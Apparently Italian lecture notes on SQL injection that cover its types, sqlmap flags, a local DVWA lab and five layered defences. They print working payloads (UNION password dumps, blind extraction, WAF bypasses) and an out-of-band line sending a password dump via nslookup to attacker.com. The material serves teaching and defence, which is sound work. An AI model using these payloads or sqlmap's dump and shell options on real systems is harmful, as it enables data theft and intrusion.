1 · Anatomia della SQL Injection

La definizione OWASP canonica: SQL injection è un'iniezione di codice che sfrutta la concatenazione di input non fidati in query SQL dinamiche, permettendo all'attaccante di alterare la logica della query eseguita dal database.

Il meccanismo fondamentale è la confusione tra codice e dati: una stringa SQL è codice, i valori che passa l'utente sono dati, ma quando li concateni in una stringa questa distinzione sparisce.

Le 3 condizioni necessarie

Perché esista una SQLi devono verificarsi tutte e tre queste condizioni. Se manca anche solo una, la vulnerabilità non c'è:

  • 1 · Input user-controlled: c'è un dato che proviene dall'utente — query string, form, cookie, header, upload, API parameter.
  • 2 · Flusso verso la query: quell'input finisce, direttamente o indirettamente, in una stringa SQL eseguita dal DB. Include flussi indiretti come input salvato in DB e riletto da un'altra parte dell'applicazione (second-order SQLi).
  • 3 · Nessuna parametrizzazione: la query è costruita per concatenazione di stringhe, senza prepared statements né sanitization efficace.
La condizione 3 è dove tipicamente si rompe la catena: prepared statements in tutti i linguaggi moderni (PDO PHP, psycopg Python, pg Node, JDBC Java) rompono strutturalmente la condizione 3. Le altre "difese" (escape, filtri, blocklist) sono palliativi bypassabili.
Il primo paper pubblico su SQLi è di Jeff Forristal (alias Rain Forest Puppy), apparso su Phrack Magazine nel 1998. Sono 28 anni che ne parliamo, ed è ancora la vulnerabilità web più comune. Questo ci dice qualcosa sul fatto che è un problema di processo di sviluppo, non di conoscenza tecnica.

2 · OWASP A03:2021 Injection — storia e categoria

OWASP Top 10 è la classifica di riferimento in sicurezza applicativa, aggiornata ogni 3-4 anni dalla OWASP Foundation. La SQLi è nel ranking dal 2003. È stata al primo posto per 11 anni consecutivi (dal 2010 al 2017).

Cosa comprende la categoria A03:2021 Injection

Nel 2021 OWASP ha ristrutturato il Top 10: ora si parla di categorie invece che singole vulnerabilità, e il ranking combina 3 fattori (incidenza, exploitability, impatto). La categoria A03 raggruppa diversi CWE correlati:

  • CWE-89 SQL Injection
  • CWE-79 Cross-Site Scripting (Reflected/Stored)
  • CWE-77 Command Injection
  • CWE-94 Code Injection
  • CWE-917 EL / Template Injection
  • CWE-91 XML Injection (XPath, XXE)

Tutte queste vulnerabilità condividono lo stesso pattern: input non fidato che viene eseguito come codice nel contesto sbagliato.

Dato chiave dal report OWASP 2021: il 94% delle applicazioni testate aveva qualche forma di injection, con 274.000 istanze su 500k+ analizzate e 33 CWE mappati alla categoria.

SQLi come categoria è "scesa" non perché sia meno frequente, ma perché la categoria raccoglie più vulnerabilità oggi e alcuni framework moderni (ORM, template engines safe-by-default) riducono l'esposizione. Sulle app legacy, tuttavia, SQLi rimane estremamente diffusa.

3 · Query concatenata vs Prepared Statement

Il punto centrale della difesa contro SQLi è strutturale, non reattivo. Confronta i due pattern:

✗ VULNERABILE — concatenazione
user_input = request.form['username']

query = "SELECT * FROM users " \
        "WHERE name = '" + \
        user_input + "'"

cursor.execute(query)

# Payload: admin' OR '1'='1
# Query eseguita:
# SELECT * FROM users
# WHERE name = 'admin' OR '1'='1'
✓ SICURO — prepared statement
user_input = request.form['username']

cursor.execute(
    "SELECT * FROM users "
    "WHERE name = %s",
    (user_input,)
)

# Payload: admin' OR '1'='1
# DB cerca letteralmente un user
# con nome admin'' OR ''1''=''1'
# e non lo trova. Neutralizzato.

Il driver DB tratta %s come placeholder: il valore viene passato separato dalla query SQL. L'input utente non può mai diventare codice.

Il placeholder della psycopg2 è %s: è il formato DB-API Python, non printf-style. In altri driver può essere ? (JDBC), $1 (pg Node), :param (SQLAlchemy named). Sono equivalenti: tutti dicono al driver "qui va un valore, non un frammento di SQL". Il driver poi dialoga col DB usando il protocollo native (per PostgreSQL: Extended Query Protocol, dove Parse arriva senza parametri, Bind arriva con i valori in formato binario, Execute gira il tutto). Il DB non "vede" mai l'input utente come SQL.
⚠ Alcune librerie (PDO PHP con default configurato male) simulano i prepared statements lato client: la concatenazione avviene a livello di driver ma con escape automatico. Funziona, ma è intrinsecamente più debole. Attiva i "real prepared statements" (server-side): in psycopg2 sono attivi di default, in PDO PHP devi impostare ATTR_EMULATE_PREPARES = false.

4 · Tipo 1 · In-Band SQL Injection (error + UNION)

In-band significa che i dati escono dallo stesso canale HTTP della richiesta. È il caso ottimale per l'attaccante: c'è un canale di ritorno diretto, risposta visibile nella pagina HTML.

1a · Error-based

Il payload provoca un errore del DB. Il messaggio d'errore contiene i dati che l'attaccante vuole leggere (tabella, colonna, valore).

# Payload PostgreSQL — EXTRACTVALUE
?id=1 AND (SELECT 1 FROM CAST(version() AS int))

# DB risponde:
ERROR: invalid input syntax for integer:
  "PostgreSQL 16.1 on x86_64..."

Su PostgreSQL le funzioni classiche sono CAST(). Su MySQL si usa EXTRACTVALUE e UPDATEXML. Su SQL Server si sfruttano conversion errors con CONVERT.

⚠ Difesa: in produzione MAI errori DB verbosi esposti all'utente — sempre generic error page + log dettagliato server-side.

1b · UNION-based

Il payload appende un UNION SELECT alla query originale. Il DB risponde con i dati della seconda query mescolati ai primi.

# Payload — dump users tramite UNION
?id=1 UNION SELECT username,password FROM users

# La pagina mostra in output:
admin  :  5f4dcc3b5aa765d61d8327deb882cf99

Il workflow UNION richiede 3 passi meccanici:

  • Conoscere il numero di colonne della query originale: ORDER BY 1, ORDER BY 2, finché arriva l'errore "column index out of range"
  • Conoscere il punto di output: SELECT null,null,'test',null per vedere dove "test" compare nella pagina
  • Tipi compatibili: SELECT null,null,null,null e poi si sostituiscono null con valori del tipo corretto
sqlmap automatizza il workflow UNION in 30 secondi. Per l'attaccante manuale è il canale più semplice; per il difensore è il più visibile nei log applicativi.

5 · Tipo 2 · Blind Boolean-Based

Blind = nessun dato in chiaro nella risposta. Nessun errore, nessun dato echoed. L'attaccante inferisce UN BIT alla volta da differenze nel comportamento della pagina.

Scenario tipico: login form che risponde HTTP 200 con "Benvenuto" se query OK, HTTP 200 con "Login fallito" se no. L'attaccante sa solo una cosa per ogni richiesta: la query è TRUE o FALSE?

Tecnica: estrazione 1 bit per request

# Payload esempio — estrae lettera 1 di password:
' AND SUBSTRING(
    (SELECT password FROM users
     WHERE user='admin'),1,1)='a'--

# Pagina dice 'Benvenuto'? lettera 1 = 'a'
# Pagina dice 'Fallito'? prova 'b' ... 'z'

Con binary search (SUBSTRING > 'm' per dividere a metà lo spazio) si riduce a ~7 richieste per carattere (2^7 = 128 > 95 ASCII stampabili). sqlmap implementa questa strategia di default.

Le condizioni per riconoscere boolean-based: deve esserci una differenza osservabile tra risposta TRUE e FALSE. La differenza può essere nel codice HTTP (200 vs 500), nel content-length, in un testo specifico della pagina, persino in header come Set-Cookie o Location. sqlmap testa automaticamente diversi "discriminators". Se l'app risponde sempre uguale, si scende a time-based.
⚠ Le risposte generiche consistenti (sempre "operazione completata" indipendentemente da risultato) eliminano boolean-based ma non time-based. La sola difesa vera rimane prepared statements strutturali.

6 · Tipo 3 · Blind Time-Based

Quando anche il comportamento della pagina è identico (nessuna differenza nel body, nessuna differenza nello status), si usa il tempo di risposta come canale di feedback.

Il trucco: forzare il DB a dormire (SLEEP) solo se la condizione è vera. Se la risposta arriva dopo 5 secondi → condizione vera. Se arriva subito → condizione falsa.

Funzioni SLEEP per DBMS

DBMSFunzione
PostgreSQLpg_sleep(5)
MySQLSLEEP(5)
SQL ServerWAITFOR DELAY '0:0:5'
OracleDBMS_LOCK.SLEEP(5)
# Payload completo PostgreSQL:
' AND (SELECT CASE WHEN
  (SUBSTRING(pwd,1,1)='a')
  THEN pg_sleep(5) END)--

sqlmap riconosce automaticamente il DBMS dal banner e sceglie la funzione giusta. Time-based SQLi è il "last resort" del pentester: funziona quasi sempre, è il più rumoroso e lento.

Alcuni DB non hanno SLEEP ma si possono simulare con BENCHMARK() in MySQL (ripete operazione N volte) o heavy join in Oracle. Problemi pratici: jitter di rete crea falsi positivi — un server lento in quel momento legge come "condition true". sqlmap compensa facendo media su 3-5 richieste. Con WAF aggressivi, i payload SLEEP sono spesso in blocklist: si bypassa con variant spelling (SLEEP(5) vs SLEEP(0x05), case, whitespace).
Rilevamento difensivo: il time-based SQLi è VISIBILE nei log delle query con EXPLAIN/pg_stat_statements — query con durata >5s da IP utente sono anomale. pgAudit (L9) logga anche le query time-based consumption.

7 · Tipo 4 · Out-of-Band

Canale di esfiltrazione completamente separato dalla richiesta HTTP. Avanzato — sqlmap lo supporta con --dns-domain.

Meccanismo: invece di esfiltrare i dati dentro la risposta HTTP, si mandano fuori via DNS. Il DB esegue una SELECT password, poi fa una DNS lookup a password_value.attacker.com. L'attaccante, che controlla il DNS server di attacker.com, legge la password nei log delle query DNS.

# Payload tipico PostgreSQL:
'; COPY (SELECT password FROM users) TO PROGRAM
  'nslookup $(cat)\.attacker.com'--

Perché funziona: molti network permettono DNS egress anche quando bloccano HTTP. È il modo in cui si esfiltra da segmenti di rete chiusi.

Funzioni OOB per DBMS

  • SQL Server: xp_dirtree
  • Oracle: UTL_HTTP
  • MySQL: LOAD_FILE con secure_file_priv disattivato
  • PostgreSQL: COPY TO PROGRAM (richiede superuser)
Burp Collaborator e interactsh (progetto ProjectDiscovery) sono strumenti gratuiti per testare OOB: generano un hostname univoco e loggano tutti gli hit DNS/HTTP. Se l'app è vulnerabile a OOB, vedi un hit ricevuto entro 1-2 secondi dalla richiesta.
⚠ Difesa specifica: egress filtering + DNS monitoring. Il DB production non dovrebbe fare lookup DNS di domini esterni non in allowlist.
Second-order SQLi: variante dove il payload viene salvato (es. profile.name = 'admin'; DROP TABLE') e trigghera in un contesto diverso (admin panel che fa SELECT * FROM log WHERE user=' + profile.name). Molto insidioso perché test automatici lineari non lo colgono.

9 · sqlmap · workflow e flag principali

sqlmap è lo strumento standard mondiale per detection e exploitation automatizzata di SQL injection. Scritto in Python, open source, sviluppato dal 2006 da Bernardo Damele (ora Miroslav Stampar), mantiene 19+ anni di sviluppo attivo su GitHub. Integrato di default in Kali Linux.

Workflow 6 step

  • 1 · Target: URL con parametro vuln
  • 2 · Detect: individua tipo SQLi provando payload B/E/U/S/T/Q
  • 3 · Fingerprint: identifica DBMS (banner + syntax-specific + error fingerprint)
  • 4 · Enumerate: DB → tabelle → colonne (via information_schema)
  • 5 · Dump: estrae dati
  • 6 · Crack: hash → password (integrazione hashcat/john)

Flag CLI più usati

FlagUso
-u URLtarget (GET)
--data="a=1"target (POST)
--cookie="..."sessione autenticata
--dbsenumera DB
-D <db> --tablesenumera tabelle
-T <tbl> --columnsenumera colonne
--dumpestrai dati
--batchno prompt interattivi
--level=5 --risk=3test esaustivo
--technique=BEUSTQscegli tecniche: B E U S T Q
--os-shell⚠ shell tramite DB (dual-use)
Il flag --technique accetta lettere: B (boolean-blind), E (error-based), U (union), S (stacked queries), T (time-based), Q (inline query). --level (1-5) aumenta profondità: livello 1 solo parametri GET/POST, livello 5 include cookie, user-agent. --risk (1-3) autorizza payload più invasivi: risk 3 include stacked queries con UPDATE/INSERT. --os-shell è la killer feature: quando il DB gira come superuser e l'OS lo permette (xp_cmdshell su MSSQL, sys_exec su MySQL con UDF, COPY TO PROGRAM su PostgreSQL), sqlmap apre una shell interattiva sul server.

Installazione

$ pip install sqlmap --break-system-packages
$ sudo apt install sqlmap

10 · DVWA in container Podman

DVWA (Damn Vulnerable Web Application) è un'app PHP volontariamente vulnerabile creata per training. Creata nel 2010 da Ryan Dewhurst come progetto didattico per OWASP. MySQL backend, 5 livelli di sicurezza (impossible / high / medium / low / insecure). Login default: admin / password.

Perché container?

  • App vulnerabile = esclusiva del proprio host (bind su 127.0.0.1, no esposizione esterna)
  • Isolamento: blast radius contenuto al container
  • Ephemeral: podman rm dopo il test, nessun dirt sul sistema
  • Replicabile: stesso setup per tutti gli studenti

Setup in 3 comandi

# 1. Pull dell'immagine DVWA
$ podman pull docker.io/vulnerables/web-dvwa

# 2. Avvio container esposto SOLO su 127.0.0.1:8080
$ podman run -d --name dvwa -p 127.0.0.1:8080:80 \
    docker.io/vulnerables/web-dvwa

# 3. Setup DB (prima volta - localhost:8080/setup.php)
$ curl -s 'http://localhost:8080/setup.php' | grep 'create_db'
⚠ DVWA è volutamente insicura. MAI esporre su rete pubblica né lasciarla in esecuzione oltre la sessione di test.

12 · Difesa 1 · Prepared Statements

La difesa strutturale per eccellenza. Il driver DB separa la query dai valori: l'input utente NON può diventare SQL.

Python · psycopg

cursor.execute(
    "SELECT * FROM users WHERE id = %s",
    (user_id,)
)
# %s è placeholder, tuple dei valori, driver fa il bind

Node.js · pg

client.query(
    'SELECT * FROM users WHERE id = $1',
    [user_id]
).then(r => ...);
// $1 è placeholder, array dei valori, pg.js fa il bind

Java · JDBC

PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?"
);
ps.setInt(1, userId);
ps.executeQuery();
// ? è placeholder
Meccanismo: il driver usa l'Extended Query Protocol (PostgreSQL) o il Binary Protocol (MySQL) per mandare Parse + Bind + Execute separatamente. Il Parse contiene la query con placeholder, NO valori utente. Il Bind contiene i valori in formato tipizzato binario. L'Execute gira il piano preparato con i bind values. Non c'è mai uno stage in cui il DB "compone" una stringa SQL con dati utente.

Pitfall e casi limite

  • Real prepared vs emulated: PDO PHP ha ATTR_EMULATE_PREPARES=true di default su alcuni driver — dannoso, va disattivato.
  • Non proteggono da SQLi via identificatori: se il nome della tabella è dinamico ('SELECT * FROM ' + table_name), prepared non aiuta. Va fatto whitelist di nomi tabella validi.
  • ORDER BY, LIMIT non possono essere parametrizzati come valori in alcuni DBMS — vanno validati via allowlist.
Approccio pragmatico: prepared per valori, allowlist per identificatori strutturali.

13 · Difesa 2 · ORM

Gli ORM (Object-Relational Mapper) traducono oggetti Python/JS/Java in query SQL parametrizzate di default. SQLAlchemy, Django ORM, Sequelize, Hibernate, Entity Framework usano tutti prepared statements sotto il cofano quando usi l'API idiomatica.

SQLAlchemy (Python)

✓ SICURO (ORM idiomatico)
session.query(User)\
    .filter_by(name=x)\
    .first()
✗ VULNERABILE (text + concat)
session.execute(
    text('... WHERE '
         'name=' + x)
)

Django ORM

✓ SICURO
User.objects.filter(
    name=user_input
).first()
✗ VULNERABILE
User.objects.raw(
    'SELECT * FROM auth'
    ' WHERE n=' + x
)

Sequelize (Node.js)

✓ SICURO
User.findOne({
    where: { name: x }
})
✗ VULNERABILE
sequelize.query(
    'SELECT FROM u '
    'WHERE n=' + x
)
⚠ L'ORM NON ti protegge se usi raw() / text() / execute() con string concatenation. È sicuro by-default per query ORM-style. Nel momento in cui "scendi" al raw SQL, torni in prepared manuali.
Caveat ORM-specific: SQLAlchemy text() con string interpolation è vulnerabile — serve text().bindparams(). Django raw() accetta params= come terzo argomento, ma molti developer lo dimenticano. Sequelize query() con replacements={} usa bind; con literal è raw concat. LINQ su .NET Entity Framework è quasi sempre sicuro nativo, ma ExecuteSqlCommand con string interpolation è vulnerabile.
Audit pragmatico: grep -r 'raw(' src/ è il primo step di code review SQLi su app ORM. Politica sana: raw SQL richiede code review dedicata + test con payload SQLi classici.

14 · Difesa 3 · Input Validation (allowlist)

Difesa secondaria, mai da sola. Serve per contesti dove prepared non basta (identificatori dinamici come nomi tabella/colonna, ORDER BY).

✓ ALLOWLIST — definisci cosa è lecito
# Ordering: solo colonne note
ALLOWED = {'name', 'email', 'date'}

sort = request.args.get('sort')
if sort not in ALLOWED:
    sort = 'name'  # default safe

query = f"SELECT ... ORDER BY {sort}"
# sort è in lista finita: concat sicura
✗ BLOCKLIST — bloccare parole "cattive"
BAD = ['SELECT','UNION','DROP']

def sanitize(s):
    for b in BAD:
        s = s.replace(b,'')
    return s

# Bypass banali:
SELSELECTECT → dopo replace = SELECT
sElEcT / SEL%20ECT / UNION#SELECT

Regola aurea

Allowlist (lista chiusa di valori validi) è robusta. Blocklist è intrinsecamente fragile — c'è sempre un bypass. Principio: se puoi enumerare i valori leciti, enumerali.

Pattern di allowlist efficace

  • Lista chiusa di valori
  • Default safe quando input non matcha
  • Error handling che non dice "unsafe input" al client (feedback all'attaccante)
  • Validazione all'ingresso del sistema (parameter binding, non in mezzo al codice)
Regex validation: utile per formati specifici — email, UUID, ISO date. Esempio per UUID: ^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$. Se passa la regex → sicuro da concatenare.
Tipi forti aiutano: in Python typed cast int(user_input) fallisce con eccezione se non è un intero, bloccando SQLi con apostrofi. Stesso con UUID, date, enum.
⚠ Validation NON sostituisce prepared — complementa. Se prepared è disponibile per il contesto, usare prepared; se non è possibile (es. ORDER BY dinamico), allora allowlist come secondo meccanismo.

15 · Difesa 4 · Least Privilege sul DB user

Principio di privilegio minimo applicato al DB. L'app si collega al DB con un utente MINIMO: se la SQLi ha successo, il blast radius è contenuto.

✗ SBAGLIATO — app user = superuser
# app.conf
DB_USER = postgres  # superuser

# Se SQLi:
• DROP TABLE users → data loss
• COPY FROM PROGRAM → RCE
• ALTER ROLE → privilege esc
• pg_read_server_files → file system
• Leggere TUTTI i DB
✓ CORRETTO — user dedicato, permessi minimi
CREATE USER app_runtime WITH
    NOSUPERUSER NOCREATEDB
    NOCREATEROLE NOREPLICATION
    NOBYPASSRLS PASSWORD '...';

GRANT CONNECT ON DATABASE app
    TO app_runtime;
GRANT USAGE ON SCHEMA public
    TO app_runtime;
GRANT SELECT, INSERT, UPDATE
    ON users, orders TO app_runtime;
-- NO DELETE, NO DROP, NO ALTER

Pattern 3-user canonico

  • app_runtime (app web): SELECT + INSERT + UPDATE sulle tabelle business. No DDL, no DELETE.
  • app_migration (CI/CD): DDL + permessi admin, attivato SOLO durante deployment via chiave separata (es. K8s Job one-shot).
  • app_readonly (reporting): SOLO SELECT, per Grafana/Metabase/analytics senza rischio di modifica.
Per i comandi pericolosi PostgreSQL: REVOKE EXECUTE ON FUNCTION pg_read_server_files FROM app_runtime; REVOKE SUPERUSER se per errore concesso; DROP EXTENSION IF EXISTS non-needed (file_fdw, dblink). Per MySQL: user senza FILE privilege per evitare LOAD_FILE(), senza PROCESS per evitare query enumeration, senza SUPER.
Menzione: Row-Level Security (RLS) in PostgreSQL permette granularità fine anche dentro la tabella — utente può vedere solo proprie righe. Ne parleremo in L9.

16 · Difesa 5 · WAF

Web Application Firewall: reverse proxy che ispeziona HTTP requests e blocca pattern sospetti PRIMA dell'app. Difesa perimetrale, ultima linea.

Cosa fa

Analizza HTTP request prima che arrivi all'app. Blocca pattern noti:

  • UNION SELECT, DROP TABLE, OR 1=1
  • encoding bypass: %27, 0x27
  • obfuscation: /*comments*/, case mix

Tipi di WAF

  • Cloud: AWS WAF, Cloudflare, Akamai, Azure Front Door
  • Reverse proxy: ModSecurity + OWASP Core Rule Set (CRS)
  • Moderno: CoraZa (Go, open-source, Apache 2.0, compatibile con ModSecurity rules)

Limiti (e perché NON basta)

  • Blocklist-based: bypass esistono per definizione
  • Payload encoding/obfuscation funzionano contro WAF non aggiornati
  • Falsi positivi: legitimate search con OR / UNION / SELECT viene bloccata

Bypass classici

UNION/**/SELECT    (commento inline)
UN%49ON SELECT     (%49 = 'I')
U%00NION SELECT    (null byte)
/*!50000 SELECT*/  (MySQL-specific)
sqlmap ha --tamper=N con 60+ moduli di bypass WAF: --tamper=space2comment,charunicodeencode,between sostituisce spazi con /**/, encoding Unicode, operatori BETWEEN. Tecniche avanzate di bypass sono un'arte: (1) inline comments per spezzare keyword; (2) case mix sElEcT; (3) URL/Unicode encoding; (4) SQL functional equivalents — invece di UNION SELECT, UNION ALL SELECT; (5) syntax-specific per DBMS.

Uso corretto

WAF = ULTIMA linea, mai prima. Serve per: rallentare attaccanti, ridurre noise, detection attacchi noti. NON sostituisce prepared statements.
Policy corretta: WAF in blocking mode per pattern high-confidence (OWASP CRS Paranoia Level 1); in detect-only mode per pattern ambigui per evitare falsi positivi; integrato con SIEM per alerting.

17 · Defense in Depth — le 5 difese in architettura

Nessuna difesa da sola è sufficiente. L'approccio resiliente combina i 5 livelli, dal più forte al più debole.

#DifesaLivelloCome
1Prepared StatementsData access layerseparazione code/data strutturale
2ORMLivello frameworkprepared by default + abstraction
3Input ValidationAll'ingressoallowlist per identificatori
4LPP DB userNel DBblast radius minimo
5WAFPerimetraleblocca pattern noti

Regola operativa

Costruire gli strati dal più forte al più debole:

  • 1° prepared statement (strutturale)
  • 2° ORM se disponibile
  • 3° input validation
  • 4° LPP DB user
  • 5° WAF (ultimo, non sostitutivo)
Mitigation math: se prepared blocca il 99% degli attacchi SQLi, e LPP riduce l'impatto del restante 1% a "lettura selettiva di tabelle business" (zero RCE, zero data loss), il rischio residuo è basso. Aggiungendo WAF si intercettano anche attacchi automatizzati generici in fase di detection.

Questo approccio è ciò che distingue un'app matura ("prepared + LPP + WAF + logging") da un'app hobbyista ("WAF solo").

18 · OWASP Database Top 10 — controlli a livello DB

L'OWASP Database Top 10 è il complemento "infrastructure" del Top 10 applicativo. Copriamo i 4 controlli più impattanti nel contesto SQLi + DB security.

A01 · Broken Access Control → Row-Level Security (RLS)

PostgreSQL RLS permette policy per-row: l'utente vede solo righe che rispettano CREATE POLICY. Mitiga completamente SQLi su filtraggio authorization: anche se c'è bypass applicativo, RLS taglia a DB level.

CREATE POLICY users_own ON orders
    USING (owner = current_user);

Anche se l'app user ha SELECT su orders, vede solo righe proprie.

A02 · Cryptographic Failures → TDE + bcrypt/argon2

TDE (Transparent Data Encryption) cripta i datafile on disk — utile per scenari di furto fisico o backup compromessi.
Password hashing: bcrypt cost 12+, argon2id con salt random 16+ bytes, mai MD5/SHA1.

La demo della mattina ha dimostrato: MD5 + rockyou.txt = secondi per crack. Un hash MD5 senza salt è equivalente a password in chiaro per un attaccante.

A07 · Auth Failures → pg_hba + scram-sha-256

Auth DB robusta (vista in L7): no trust, no 0.0.0.0/0, scram-sha-256 obbligatorio. L'app user separato da amministrazione.

A09 · Logging & Monitoring → pgAudit + log aggregati

pgAudit logga ogni query con utente, timestamp, parametri. SQLi visibile come anomalia nei log: query lunghissime, UNION inaspettate, access pattern strani. Integrazione SIEM (Splunk, ELK, Datadog) per alerting in tempo reale.

L'assenza di monitoring è il motivo per cui molti breach via SQLi vengono scoperti mesi dopo. pgAudit è lo standard per audit trail su PostgreSQL — lo vedremo in dettaglio in L9.
Altri controlli OWASP DB Top 10 (non coperti in L8, per approfondimento personale):
• A04 Insecure Design — schema DB pensato senza threat model
• A05 Security Misconfig — defaults insicuri
• A06 Vulnerable Components — CVE su DBMS non patchato
• A08 Integrity Failures — CI/CD pipeline per DB migrations
• A10 SSRF — meno rilevante per DB
